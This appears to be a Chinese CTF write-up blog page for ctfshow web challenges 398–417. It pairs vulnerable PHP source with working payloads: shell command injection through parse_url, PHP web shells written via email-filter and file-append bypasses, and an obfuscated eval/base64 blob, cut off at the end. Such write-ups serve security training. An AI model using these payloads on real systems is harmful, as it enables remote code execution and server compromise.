<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033319.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331203325243"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033697.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331203335633"></p>

<pre><code>?url=http://www/qqq;cat fl0g.php &gt; 2.txt
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312035864.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220331203522793"></p>

<h1 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:00:42
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    if(!preg_match(&#39;/;/&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt
?url=http://1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:04:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    if(!preg_match(&#39;/;|&gt;/&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt
?url=http://1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:13:14
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    if(!preg_match(&#39;/;|&gt;|http|https/i&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt
?url=http://1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:16:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


#error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    var_dump($url);
    if(!preg_match(&#39;/;|&gt;|http|https|\|/i&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt
?url=http://1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:35:41
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


#error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    var_dump($url);
    if(preg_match(&#39;/http|https/i&#39;, $url[&#39;scheme&#39;]))&#123;
        die(&#39;error&#39;);
    &#125;
    if(!preg_match(&#39;/;|&gt;|\||base/i&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<pre><code class="php">?url=file://1/1;echo `ls`&gt;a.txt
?url=file://1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 18:44:06
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    if(preg_match(&#39;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#39;, $url[&#39;host&#39;]))&#123;
        shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
&#125;

</code></pre>
<pre><code class="php">?url=http://127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt
</code></pre>
<h1 id="405"><a href="#405" class="headerlink" title="405"></a>405</h1><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 19:20:10
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    if(preg_match(&#39;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#39;, $url[&#39;host&#39;]))&#123;
        if(preg_match(&#39;/^\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&#123;
            if(preg_match(&#39;/\~|\.|php/&#39;, $url[&#39;scheme&#39;]))&#123;
                shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);
            &#125;
            
        &#125;
    &#125;

&#125;else&#123;
    highlight_file(__FILE__);
    echo &#39;parse_url 好强大&#39;;
&#125;
parse_url 好强大
</code></pre>
<pre><code class="php">?url=httphp://127.0.0.1111;echo `cat f*`&gt;1.txt;11/a
</code></pre>
<h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-16 14:58:50
 Last Modified by:   h1xa
 Last Modified time: 2021-01-16 16:00:51
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

require &#39;config.php&#39;;
//flag in db
highlight_file(__FILE__);
$url=$_GET[&#39;url&#39;];
if(filter_var ($url,FILTER_VALIDATE_URL))&#123;
    $sql = &quot;select * from links where url =&#39;&#123;$url&#125;&#39;&quot;;
    $result = $conn-&gt;query($sql);
&#125;else&#123;
    echo &#39;不通过&#39;;
&#125;

Notice: Undefined index: url in /var/www/html/index.php on line 17
不通过
</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lxfweb/p/13757525.html">PHP代码审计02之filter_var()函数缺陷</a></p>
<h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><pre><code class="php">
 &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-16 14:58:50
 Last Modified by:   h1xa
 Last Modified time: 2021-01-16 17:24:13
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);
error_reporting(0);
$ip=$_GET[&#39;ip&#39;];

if(filter_var ($ip,FILTER_VALIDATE_IP))&#123;
    call_user_func($ip);
&#125;

class cafe&#123;
    public static function add()&#123;
        echo file_get_contents(&#39;flag.php&#39;);
    &#125;
&#125;



</code></pre>
<p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002  是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p>
<p>被认为是ipv6地址</p>
<pre><code class="php">?ip=cafe::add
</code></pre>
<h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-16 14:58:50
 Last Modified by:   h1xa
 Last Modified time: 2021-01-16 19:53:18
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);
error_reporting(0);
$email=$_GET[&#39;email&#39;];

if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;
    file_put_contents(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);
&#125;
</code></pre>
<pre><code class="php">email=&quot;&lt;?=system($_POST[1]);?&gt;&quot;@123.php
</code></pre>
<p>非法字符可以放在双引号里面绕过检测</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130131892.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415130131892"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130222833.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415130222833"></p>

<h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-16 14:58:50
 Last Modified by:   h1xa
 Last Modified time: 2021-01-16 20:26:16
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


highlight_file(__FILE__);
error_reporting(0);
$email=$_GET[&#39;email&#39;];
if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;
    $email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);
    eval($email);
&#125;
</code></pre>
<p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的&lt;?php</p>
<p>可行但是发现前面的”也是非法的<br>题目有个替换为.flag也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p>
<pre><code class="php">?email=&quot;flagsystem($_POST[1]);?&gt;&quot;@123.com
POST
1=cat /flag
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130816722.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415130816722"></p>

<h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 13:12:41
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include(&#39;flag.php&#39;);
$b=$_GET[&#39;b&#39;];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;
    if($b==&#39;true&#39; || intval($b)&gt;0)&#123;
        die(&#39;FLAG NOT HERE&#39;);
    &#125;else&#123;
        echo $flag;
    &#125;
&#125;
</code></pre>
<pre><code class="php">
定义和用法
FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。

Name: &quot;boolean&quot;
ID-number: 258
可能的返回值：

如果是 &quot;1&quot;, &quot;true&quot;, &quot;on&quot; 以及 &quot;yes&quot;，则返回 true。
如果是 &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot; 以及 &quot;&quot;，则返回 false。
否则返回 NULL。
</code></pre>
<pre><code class="php">?b=yes
</code></pre>
<h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 13:12:41
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include(&#39;flag.php&#39;);
$b=$_GET[&#39;b&#39;];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;
    if($b==&#39;true&#39; || intval($b)&gt;0 ||$b==&#39;on&#39; || $b==&#39;ON&#39;)&#123;
        die(&#39;FLAG NOT HERE&#39;);
    &#125;else&#123;
        echo $flag;
    &#125;
&#125;
</code></pre>
<pre><code class="php">?b=yes
</code></pre>
<h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 16:19:28
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);

$ctfshow=$_POST[&#39;ctfshow&#39;];

if(isset($ctfshow))&#123;
    file_put_contents(&#39;flag.php&#39;, &#39;//&#39;.$ctfshow,FILE_APPEND);
    include(&#39;flag.php&#39;);
&#125;

</code></pre>
<pre><code class="php">ctfshow=?&gt;&lt;?php eval($_POST[1]);&amp;1=system(&#39;cat flag.php&#39;);
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415132225921.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415132225921"></p>

<pre><code class="php">ctfshow=%0asystem(&#39;tac f*&#39;);
</code></pre>
<h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 16:19:28
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);

$ctfshow=$_POST[&#39;ctfshow&#39;];

if(isset($ctfshow))&#123;
        file_put_contents(&#39;flag.php&#39;, &#39;/*&#39;.$ctfshow.&#39;*/&#39;,FILE_APPEND);
    include(&#39;flag.php&#39;);
&#125;


Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16
</code></pre>
<pre><code class="php">ctfshow=/eval($_POST[1]);/&amp;1=system(‘cat flag.php’);
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415133217378.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415133217378"></p>

<h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 16:43:53
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
include(&#39;flag.php&#39;);
$ctfshow=$_GET[&#39;ctfshow&#39;];

if($ctfshow==true)&#123;
    if(sqrt($ctfshow)&gt;=sqrt(intval($flag)))&#123;
        echo &#39;FLAG_NOT_HERE&#39;;
    &#125;else&#123;
        echo $flag;
    &#125;
&#125;

Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16
</code></pre>
<pre><code class="平衡盘">?ctfshow=-1
</code></pre>
<p>sqrt() 函数返回一个数的平方根。</p>
<p> 返回 number 的平方根，如果 number 是负数则返回 NAN。</p>
<h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 19:15:52
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);

$k = $_GET[k];

function getflag()&#123;
    echo file_get_contents(&#39;flag.php&#39;);
&#125;

if($k==&#39;getflag&#39;)&#123;
    die(&#39;FLAG_NOT_HERE&#39;);
&#125;else&#123;
    call_user_func($k);
&#125;


</code></pre>
<pre><code class="php">?k=getflaG
</code></pre>
<h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-25 23:07:21
 Last Modified by:   h1xa
 Last Modified time: 2021-01-26 19:54:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);

class ctf&#123;
    public function getflag()&#123;
        return &#39;fake flag&#39;;
    &#125;
    final public function flag()&#123;
        echo file_get_contents(&#39;flag.php&#39;);
    &#125;
&#125;

class show extends ctf&#123;
    public function __construct($f)&#123;
        call_user_func($f);
    &#125;
&#125;

echo new show($_GET[f]);
</code></pre>
<pre><code class="php">?f=ctf::flag
</code></pre>
<h1 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h1><pre><code class="php">
&lt;?php /*ctfshow*/
define(&#39;aPeKTP0126&#39;, __FILE__);
$cIYMfW = urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);
$CBhSfw = $cIYMfW[3] . $cIYMfW[6] . $cIYMfW[33] . $cIYMfW[30];
$xWoIVy = $cIYMfW[33] . $cIYMfW[10] . $cIYMfW[24] . $cIYMfW[10] . $cIYMfW[24];
$RkEEuV = $xWoIVy[0] . $cIYMfW[18] . $cIYMfW[3] . $xWoIVy[0] . $xWoIVy[1] . $cIYMfW[24];
$YFfKrW = $cIYMfW[7] . $cIYMfW[13];
$CBhSfw .= $cIYMfW[22] . $cIYMfW[36] . $cIYMfW[29] . $cIYMfW[26] . $cIYMfW[30] . $cIYMfW[32] . $cIYMfW[35] . $cIYMfW[26] . $cIYMfW[30];
eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMw